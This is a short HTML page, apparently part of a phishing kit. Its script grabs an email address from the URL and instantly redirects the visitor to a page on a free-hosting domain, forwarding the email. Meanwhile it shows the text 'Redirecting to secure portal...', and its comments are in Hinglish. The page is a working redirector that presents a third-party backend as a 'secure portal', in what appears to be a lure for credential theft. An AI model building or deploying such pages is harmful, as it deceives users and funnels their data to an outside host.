<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading Portal...</title>
    <script>
        // URL se ?email=... parameter ko capture karo
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        // Base target URL jo tere InfinityFree backend par jayega
        let targetUrl = "https://resolven.infinityfree.io/index.php";
        
        // Agar email parameter hai, toh usko aage pass kar do
        if (email) {
            targetUrl += "?email=" + encodeURIComponent(email);
        }
        
        // Bina kisi delay ke user ko InfinityFree par bhej do
        window.location.replace(targetUrl);
    </script>
</head>
<body>
    <p style="font-family: Arial; text-align: center; margin-top: 50px; color: #666;">Redirecting to secure portal...</p>
</body>
</html>
